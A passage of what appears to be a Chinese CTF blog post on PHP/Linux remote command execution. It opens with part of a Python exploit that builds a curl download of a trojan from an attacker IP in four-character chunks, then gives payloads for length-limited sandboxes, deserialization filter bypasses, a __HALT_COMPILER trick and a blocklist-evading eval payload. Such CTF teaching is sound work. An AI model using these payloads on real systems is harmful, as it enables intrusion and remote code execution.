class="string">&#x27;&gt;p&#x27;</span> ,</span><br><span class="line">     <span class="string">&#x27;&gt;ph\\&#x27;</span> ,</span><br><span class="line">     <span class="string">&#x27;&gt;\|\\&#x27;</span> ,</span><br><span class="line">     <span class="string">&#x27;&gt;%s\\&#x27;</span>  %  ip[ <span class="number">8</span> : <span class="number">10</span> ],</span><br><span class="line">     <span class="string">&#x27;&gt;%s\\&#x27;</span>  %  ip[ <span class="number">6</span> : <span class="number">8</span> ],</span><br><span class="line">     <span class="string">&#x27;&gt;%s\\&#x27;</span>  %  ip[ <span class="number">4</span> : <span class="number">6</span> ],</span><br><span class="line">     <span class="string">&#x27;&gt;%s\\&#x27;</span>  %  ip[ <span class="number">2</span> : <span class="number">4</span> ],</span><br><span class="line">     <span class="string">&#x27;&gt;%s\\&#x27;</span>  %  ip[ <span class="number">0</span> : <span class="number">2</span> ],</span><br><span class="line">     <span class="string">&#x27;&gt;\ \\&#x27;</span> ,</span><br><span class="line">     <span class="string">&#x27;&gt;rl\\&#x27;</span> ,</span><br><span class="line">     <span class="string">&#x27;&gt;cu\\&#x27;</span> ,</span><br><span class="line">  </span><br><span class="line">     <span class="string">&#x27;sh &#x27;</span>  +  pos2,</span><br><span class="line">     <span class="comment"># sh g ;g 的内容是 ls -tk &gt; f ，那么就会把逆序的命令反转回来，</span></span><br><span class="line">     <span class="comment"># 虽然 f 的文件头部会有杂质，但不影响有效命令的执行</span></span><br><span class="line">     <span class="string">&#x27;sh &#x27;</span>  +  pos0,</span><br><span class="line">     <span class="comment"># sh f 执行curl命令，下载文件，写入木马。</span></span><br><span class="line">]</span><br><span class="line">  </span><br><span class="line">s  =  r.get(reset)</span><br><span class="line"><span class="keyword">for</span>  i  <span class="keyword">in</span>  payload:</span><br><span class="line">     <span class="keyword">assert</span>  <span class="built_in">len</span> (i) &lt; =  <span class="number">4</span></span><br><span class="line">     s  =  r.get(cmd  +  i)</span><br><span class="line">     <span class="built_in">print</span>  <span class="string">&#x27;[%d]&#x27;</span>  %  s.status_code, s.url</span><br><span class="line">     sleep( <span class="number">0.1</span> )</span><br><span class="line">s  =  r.get(sandbox  +  <span class="string">&#x27;fun.php?cmd=uname -a&#x27;</span> )</span><br><span class="line"><span class="built_in">print</span>  <span class="string">&#x27;[%d]&#x27;</span>  %  s.status_code, s.url</span><br><span class="line"><span class="built_in">print</span>  s.text</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3><span id="sp-数组绕过"> SP: 数组绕过</span></h3>
<p>来自鹏城杯2023X1r0z师傅的解法</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$sandbox</span> = <span class="string">&#x27;/var/www/html/sandbox&#x27;</span> .<span class="title function_ invoke__">md5</span>(<span class="string">&quot;5050f6511ffb64e1914be4ca8b9d585c&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>].<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">mkdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">    <span class="title function_ invoke__">chdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;title&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line">        <span class="variable">$title</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;title&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$data</span>)&gt;<span class="number">5</span> || <span class="title function_ invoke__">strlen</span>(<span class="variable">$title</span>)&gt;<span class="number">3</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;no!no!no!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$sandbox</span>.<span class="variable">$title</span>, <span class="variable">$data</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$title</span>))&lt;=<span class="number">10</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">system</span>(<span class="string">&#x27;php &#x27;</span> .<span class="variable">$sandbox</span>.<span class="variable">$title</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="title function_ invoke__">system</span>(<span class="string">&#x27;rm &#x27;</span>.<span class="variable">$sandbox</span>.<span class="variable">$title</span>);</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;no!no!no!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;reset&#x27;</span>]))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&#x27;/bin/rm -rf &#x27;</span> . <span class="variable">$sandbox</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里将文件名限制在了3个字符以内，内容限制在了5个字符以内，更加的困难</p>
<p>这道题的正常解法大概是这样的：</p>
<p>还记得之前的几个特性吗？</p>
<blockquote>
<ol>
<li>sh文件能够将正常的文件当sh命令来执行</li>
<li>*能够匹配ls的结果，并且将ls的第一个文件作为指令，其余的文件名作为参数</li>
</ol>
</blockquote>
<p>所以这题的解法就是：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. title=sh&amp;data=1</span><br><span class="line">2. title=t&amp;data=nl /*</span><br><span class="line">3. title=w;*&amp;data</span><br></pre></td></tr></table></figure>
<p>这样子的话第一步会生成一个<code>sh</code>的文件名，我们只需要其文件名</p>
<p>第二步会生成一个<code>t</code>的文件名(确保其ls之后在<code>sh</code>之后)，我们只需要其内容</p>
<p>第三步用<code>w</code>闭合前面的php，分号分割后利用<code>*</code>直接能够执行<code>sh t</code></p>
<p>此时相当于执行<code>nl /*</code>，自然能读到flag</p>
<p>另外一种解法就是利用数组绕过长度限制，直接执行命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">title[]=123&amp;data[]=&lt;?=`nl /f*`;</span><br></pre></td></tr></table></figure>
<p>利用到<code>php 123</code>也会把123当作php脚本执行</p>
<h2><span id="反序列化内过滤oad问题"> 反序列化内过滤[Oa]:[\d]+问题</span></h2>
<p>例如：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[Oa]:[\d]+/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]))&#123;</span><br><span class="line">	<span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>利用方式：</p>
<ol>
<li>如果能用<code>+</code>的话直接用加号隔断</li>
<li>换别的方法：</li>
</ol>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ArrayObject</span>:</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">ArrayObject</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt; a = 反序列化起点;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">SplStack</span>:</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">SplStack</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="title function_ invoke__">push</span>(反序列化起点);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>
<h2><span id="rce后有脏数据"> RCE后有脏数据</span></h2>
<p><code>__HALT_COMPILER();</code>能帮到你：</p>
<p><code>__HALT_COMPILER();</code>能够让编译器停止编译，当编译器执行到这就不用再执行<code>__HALT_COMPILER();</code>后面的部分了。通过提前停止编译达到了不解析脏数据，eval能够正常执行的，看demo：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">	<span class="keyword">if</span>(<span class="string">&quot;aaa&quot;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/;+/&quot;</span>, <span class="string">&quot;aaa&quot;</span>, <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[a-zA-z_\(\)]+/&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$cmd</span>)))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$cmd</span>.<span class="string">&#x27;Err0r23333333&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>利用方式：</p>
<p>它只是把<code>$cmd</code>的字母、下划线、括号置空，再用分号置换为aaa和aaa比较</p>
<p>相当于无参数RCE，问题在eval后的脏数据，我们利用<code>__HALT_COMPILER();</code>提前停止编译，就能除去Err0r23333333：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=phpinfo();__HALT_COMPILER();</span><br></pre></td></tr></table></figure>
<h2><span id="四处收集的题目"> 四处收集的题目</span></h2>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;print&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;print&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$printValue</span>= <span class="title function_ invoke__">strtolower</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;print&#x27;</span>]);</span><br><span class="line">    <span class="variable">$blocked</span> = <span class="keyword">array</span>(<span class="string">&quot;cat&quot;</span>, <span class="string">&quot;more&quot;</span> ,<span class="string">&quot;readfile&quot;</span>, <span class="string">&quot;fopen&quot;</span>, <span class="string">&quot;file_get_contents&quot;</span>, <span class="string">&quot;file&quot;</span>, <span class="string">&quot;SplFileObject&quot;</span> );</span><br><span class="line">    <span class="variable">$special_block</span>= <span class="string">&quot;nc&quot;</span>;</span><br><span class="line">    <span class="variable">$$special_block</span>= <span class="string">&quot;../flag.txt&quot;</span>;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blocked</span> <span class="keyword">as</span> <span class="variable">$value</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$printValue</span>, <span class="variable">$value</span>) || <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\bsystem|\bexec|\bbin2hex|\bassert|\bpassthru|\bshell_exec|\bescapeshellcmd| \bescapeshellarg|\bpcntl_exec|\busort|\bpopen|\bflag\.txt|\bspecial_block|\brequire|\bscandir|\binclude|\bhex2bin|\$[a-zA-Z]|[#!%^&amp;*_+=\-,\.:`|&lt;&gt;?~\\\\]/i&#x27;</span>, <span class="variable">$printValue</span>)) &#123;</span><br><span class="line">        <span class="variable">$printValue</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;Bad character/word ditected!&#x27;);&lt;/script&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">eval</span>(<span class="variable">$printValue</span> . <span class="string">&quot;;&quot;</span>);</span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;&#x27;;print(eval(&#x27;return $&#123;blocked&#125;[4]($&#123;nc&#125;);&#x27;))</span><br></pre></td></tr></table></figure>
<p>自己看吧，很好理解，相当于直接调用$blocked数组的<code>file_get_contents</code></p>
<p>感觉不如直接无参数rce，看看后面有没有过滤getallheaders咯</p>
<p>甚至还可以<code>sys$&#123;114514&#125;tem('head%09/flag');</code></p>
<p>不知道是不是上面那个形式，总之就是可以直接卡bug</p>
</div>
        </div>
        
            <div class="kratos-copyright text-center clearfix">
                <h5 itemprop="copyrightNotice">本作品采用 <a rel="license nofollow" target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/">知识共享署名-相同方式共享 4.0 国际许可协议</a> 进行许可</h5>
            </div>
        
        <footer class="kratos-entry-footer clearfix">
            
                <div class="post-like-donate text-center clearfix" id="post-like-donate">
                
                    <a class="donate" href="javascript:;"><i class="fa fa-bitcoin"></i> 打赏</a>
                
                
                    <a class="share" href="javascript:;"><i class="fa fa-share-alt"></i> 分享</a>
                    <div class="share-wrap" style="display: none;">
    <div class="share-group">
        <a href="javascript:;" class="share-plain qq" onclick="share('qq');" rel="nofollow">
            <div class="icon-wrap">
                <i class="fa fa-qq"></i>
            </div>
        </a>
        <a href="javascript:;" class="share-plain qzone" onclick="share('qzone');" rel="nofollow">
            <div class="icon-wrap">
                <i class="fa fa-star"></i>
            </div>
        </a>
        <a href="javascript:;" class="share-plain weixin pop style-plain" rel="nofollow">
            <div class="icon-wrap">
                <i class="fa fa-weixin"></i>
            </div>
            <div class="share-int">
                <div class="qrcode" id="wechat-qr"></div>
                <p>打开微信“扫一扫”，打开网页后点击屏幕右上角分享按钮</p>
            </div>
        </a>
        <a href="javascript:;" class="share-plain weibo" onclick="share('weibo');" rel="nofollow">
            <div class="icon-wrap">
                <i class="fa fa-weibo"></i>
            </div>
        </a>
        <a href="javascript:;" class="share-plain facebook style-plain" onclick="share('facebook');" rel="nofollow">
            <div class="icon-wrap">
                <i class="fa fa-facebook"></i>
            </div>
        </a>
        <a href="javascript:;" class="share-plain twitter style-plain" onclick="share('twitter');" rel="nofollow">
            <div class="icon-wrap">
                <i class="fa fa-twitter"></i>
            </div>
        </a>
    </div>
    <script type="text/javascript">
        $(()=>{
            new QRCode("wechat-qr", {
                text: "http://example.com/posts/49224.html",
                width: 150,
                height: 150,
                correctLevel : QRCode.CorrectLevel.H
            });
        });
        function share(dest) {
            const qqBase        = "https://connect.qq.com/widget/shareqq/index.html?";
            const weiboBase     = "https://service.weibo.com/share/share.php?";
            const qzoneBase     = "https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?";
            const facebookBase  = "https://www.facebook.com/sharer/sharer.php?";
            const twitterBase   = "https://twitter.com/intent/tweet?";
            const hostUrl       = "http://example.com/posts/49224.html";
            const title         = "「rce(上)」";
            const excerpt       = `有关一些php和linux命令执行的知识`;
            let _URL;
            switch (dest) {
                case "qq"       : _URL = qqBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";     break;
                case "weibo"    : _URL = weiboBase+"url="+hostUrl+"&title="+title+excerpt;                                 break;
                case "qzone"    : _URL = qzoneBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";  break;
                case "facebook" : _URL = facebookBase+"u="+hostUrl;                                                        break;
                case "twitter"  : _URL = twitterBase+"text="+title+excerpt+"&url="+hostUrl;                                break;
            }
            window.open(_URL);
        };
    </script>
</div>
                
                </div>
            
            <div class="footer-tag clearfix">
                <div class="pull-left">
                <i class="fa fa-tags"></i>
                    <a class="tag-none-link" href="/tags/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/" rel="tag">基础漏洞</a>
                </div>
                <div class="pull-date">
                    <time datetime="2024-05-15T11:43:46.000Z" itemprop="dateModified">最后编辑：2024-05-15</time>
                </div>
            </div>
        </footer>
    </div>
    
        <nav class="navigation post-navigation clearfix" role="navigation">
            
            <div class="nav-previous clearfix">
                <a title=" 文件包含" href="/posts/59563.html">&lt; 上一篇</a>
            </div>
            
            
            <div class="nav-next clearfix">
                <a title=" rce(下)" href="/posts/62381.html">下一篇 &gt;</a>
            </div>
            
        </nav>
    
    
        <div id="v-comments" class="post-comments bg-image"></div>
<script>
    var load_comm = () => {
        const init = () => {
            new Valine({
                el: '#v-comments',
                appId: 'bNjjbBH5XN8401rWT4xZhbCF-gzGzoHsz',
                appKey: 'R4c5rtiMieN1Kb3frShXDfw8',
                visitor: true,
                enableQQ: false,
                path: '/posts/49224.html'
                
            });
        }
        if (typeof Valine === 'undefined') {
            const src = '/vendors/valine@1.4.18/dist/Valine.min.js';
            $.getScript(src, init);
        } else {
            init();
        }
    };
</script>


<script>
<style>
    .v .veditor{min-height: 10rem;
        background-image: url(https://cdn.jsdelivr.net/gh/cungudafa/img/images/girls2.png);
        background-size: contain;
        background-repeat: no-repeat;
        background-position: right;
        background-color: rgba(255,255,255,0);
        resize: none;}
</style>
</script>


    <script>
        new Valine({
            el: '#vcomments',
            lang: 'zh-cn',
            admin_email: '83635877@qq.com',//博主邮箱
            appId: "",
            appKey: "",
            path: window.location.pathname,
            comment_count: true,
            //notify: false, // 邮件提醒!使用第三方就不要添加这个!!
            //verify: true, //验证码
            avatar: 'monsterid',//小怪物头像
            placeholder: "qwq~"
        });
        
</script>
    <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
    <script type="text/javascript">
        jinrishici.load(function(result) {
            var jrsc_plac =  result.data.content + "\n「" + result.data.origin.title + "」" + result.data.origin.dynasty + " · " + result.data.origin.author;
            document.getElementById("veditor").setAttribute("placeholder",jrsc_plac);
        })
    </script>

<noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="https://valine.js.org/">comments powered by Valine.</a></noscript>

    
</article>

        

            </section>

        

        <script src="./js/src/Valine.min.js"></script>   
        
        
            

<section id="kratos-widget-area" class="col-md-4 hidden-xs hidden-sm">
    <!-- 文章和页面根据splitter来分割，没有的话就从头开始设置为sticky -->
    
    
                <aside id="krw-about" class="widget widget-kratos-about clearfix">
    <div class="photo-background"></div>
    <div class="photo-wrapper clearfix">
        <div class="photo-wrapper-tip text-center">
            <img class="about-photo" src="/images/touxiang.png" loading="lazy" decoding="auto" />
        </div>
    </div>
    <div class="textwidget">
        <p class="text-center"></p>
    </div>
    <div class="site-meta">
        <a class="meta-item" href="/archives/">
            <span class="title">
                文章
            </span>
            <span class="count">
                84
            </span>
        </a>
        <a class="meta-item" href="/categories/">
            <span class="title">
                分类
            </span>
            <span class="count">
                12
            </span>
        </a>
        <a class="meta-item" href="/tags/">
            <span class="title">
                标签
            </span>
            <span class="count">
                14
            </span>
        </a>
    </div>
</aside>
            
                    <div class="sticky-area">
                
                
  <aside id="krw-categories" class="widget widget-kratos-categories clearfix">
    <h4 class="widget-title"><i class="fa fa-folder"></i>分类目录</h4>
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-Misc/">-CTF Misc</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a><span class="category-list-count">22</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/java/">java</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-Misc/">CTF Misc</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-Web/">CTF Web</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-Web-WriteUp/">CTF Web WriteUp</a><span class="category-list-count">9</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-WriteUp/">CTF WriteUp</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Intro/">Intro</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Java/">Java</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/java/">java</a><span class="category-list-count">13</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%B8%8D%E5%8A%A1%E6%AD%A3%E4%B8%9A%E7%B3%BB%E5%88%97/">不务正业系列</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/">基础漏洞</a><span class="category-list-count">16</span></li></ul>
  </aside>


            
                
  <aside id="krw-tags" class="widget widget-kratos-tags clearfix">
    <h4 class="widget-title"><i class="fa fa-tags"></i>标签聚合</h4>
      <div class="tag-clouds">
        <a href="/tags/Introduce-Myself/" style="font-size: 0.6em;">Introduce_Myself</a> <a href="/tags/Java/" style="font-size: 0.6em;">Java</a> <a href="/tags/Misc/" style="font-size: 0.63em;">Misc</a> <a href="/tags/POST/" style="font-size: 0.69em;">POST</a> <a href="/tags/RCE/" style="font-size: 0.69em;">RCE</a> <a href="/tags/SQL-Injection/" style="font-size: 0.71em;">SQL_Injection</a> <a href="/tags/Upload/" style="font-size: 0.6em;">Upload</a> <a href="/tags/Web/" style="font-size: 0.8em;">Web</a> <a href="/tags/awd/" style="font-size: 0.66em;">awd</a> <a href="/tags/java/" style="font-size: 0.74em;">java</a> <a href="/tags/%E4%B8%8D%E5%8A%A1%E6%AD%A3%E4%B8%9A/" style="font-size: 0.6em;">不务正业</a> <a href="/tags/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/" style="font-size: 0.77em;">基础漏洞</a> <a href="/tags/%E6%9D%82%E9%A1%B9/" style="font-size: 0.6em;">杂项</a> <a href="/tags/%E6%B8%97%E9%80%8F/" style="font-size: 0.71em;">渗透</a>
      </div>
  </aside>

            
                
  <aside id="krw-posts" class="widget widget-kratos-posts">
  <h4 class="widget-title"><i class="fa fa-file"></i>最新文章</h4>
  <div class="tab-content">
      <ul class="list-group">
        
        
          
          
            <a class="list-group-item" href="/posts/58260.html"><i class="fa  fa-book"></i> VulnStack 7</a>
            
          
        
          
          
            <a class="list-group-item" href="/posts/6350.html"><i class="fa  fa-book"></i> SPEL注入Spring内存马</a>
            
          
        
          
          
            <a class="list-group-item" href="/posts/58068.html"><i class="fa  fa-book"></i> VulnStack 4</a>
            
          
        
          
          
            <a class="list-group-item" href="/posts/10200.html"><i class="fa  fa-book"></i> 2024鹏城杯线上赛Web方向题解</a>
            
          
        
          
          
            <a class="list-group-item" href="/posts/49264.html"><i class="fa  fa-book"></i> dasctf十月web方向部分题解</a>
            
          
        
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
      </ul>
  </div>
  </aside>

            
    </div>
</section>

        
        </div>
    </div>
</div>
<footer>
    <div id="footer"  class="ap-lrc"  >
        <div class="container">
            <div class="row">
                <div class="col-md-6 col-md-offset-3 footer-list text-center">
                    <ul class="kratos-social-icons">
                        <li><a target="_blank" rel="nofollow" href="https://weibo.com/u/HyDr0genSpectRuM"><i class="fa fa-weibo"></i></a></li>
                        
                        
                        
                        
                        
                        
                        <li><a target="_blank" rel="nofollow" href="https://github.com/Err0r233"><i class="fa fa-github"></i></a></li>
                        
                    </ul>
                    <ul class="kratos-copyright">
                        <div>
                            <li>&copy; 2024 Err0r233 版权所有.</li>
                            <li>本站已运行<span id="span_dt">Loading...</span></li>
                        </div>
                        <div>
                            <li>Theme <a href="https://github.com/Candinya/Kratos-Rebirth" target="_blank">Kratos:Rebirth</a></li>
                            <li>Site built with&nbsp;<i class="fa fa-heart throb" style="color:#d43f57"></i>&nbsp;by Err0r2333.</li>
                        </div>
                        <div>
                            <li>Powered by <a href="https://hexo.io" target="_blank" rel="nofollow">Hexo</a></li>
                            <li>Hosted on <a href="https://github.io" target="_blank">Github Pages</a></li>
                        </div>
                        <div>
                            
                            
                        </div>
                        <div id="binft"></div>
  <script>
    var binft = function (r) {
      function t() {
        return b[Math.floor(Math.random() * b.length)]
      }  
      function e() {
        return String.fromCharCode(94 * Math.random() + 33)
      }
      function n(r) {
        for (var n = document.createDocumentFragment(), i = 0; r > i; i++) {
          var l = document.createElement("span");
          l.textContent = e(), l.style.color = t(), n.appendChild(l)
        }
        return n
      }
      function i() {
        var t = o[c.skillI];
        c.step ? c.step-- : (c.step = g, c.prefixP < l.length ? (c.prefixP >= 0 && (c.text += l[c.prefixP]), c.prefixP++) : "forward" === c.direction ? c.skillP < t.length ? (c.text += t[c.skillP], c.skillP++) : c.delay ? c.delay-- : (c.direction = "backward", c.delay = a) : c.skillP > 0 ? (c.text = c.text.slice(0, -1), c.skillP--) : (c.skillI = (c.skillI + 1) % o.length, c.direction = "forward")), r.textContent = c.text, r.appendChild(n(c.prefixP < l.length ? Math.min(s, s + c.prefixP) : Math.min(s, t.length - c.skillP))), setTimeout(i, d)
      }
      var l = "",
      o = ["青青陵上柏，磊磊涧中石。", "人生天地间，忽如远行客。","斗酒相娱乐，聊厚不为薄。", "驱车策驽马，游戏宛与洛。","洛中何郁郁，冠带自相索。","长衢罗夹巷，王侯多第宅。","两宫遥相望，双阙百余尺。","极宴娱心意，戚戚何所迫？"].map(function (r) {
      return r + ""
      }),
      a = 2,
      g = 1,
      s = 5,
      d = 75,
      b = ["rgb(110,64,170)", "rgb(150,61,179)", "rgb(191,60,175)", "rgb(228,65,157)", "rgb(254,75,131)", "rgb(255,94,99)", "rgb(255,120,71)", "rgb(251,150,51)", "rgb(226,183,47)", "rgb(198,214,60)", "rgb(175,240,91)", "rgb(127,246,88)", "rgb(82,246,103)", "rgb(48,239,130)", "rgb(29,223,163)", "rgb(26,199,194)", "rgb(35,171,216)", "rgb(54,140,225)", "rgb(76,110,219)", "rgb(96,84,200)"],
      c = {
        text: "",
        prefixP: -s,
        skillI: 0,
        skillP: 0,
        direction: "forward",
        delay: a,
        step: g
      };
      i()
      };
      binft(document.getElementById('binft'));
  </script>
                    </ul>
                </div>
            </div>
        </div>
        <div class="kr-tool text-center">
            <div class="tool">
                
                    <div class="box search-box">
                        <a href="/search/">
                            <span class="fa fa-search"></span>
                        </a>
                    </div>
                
                
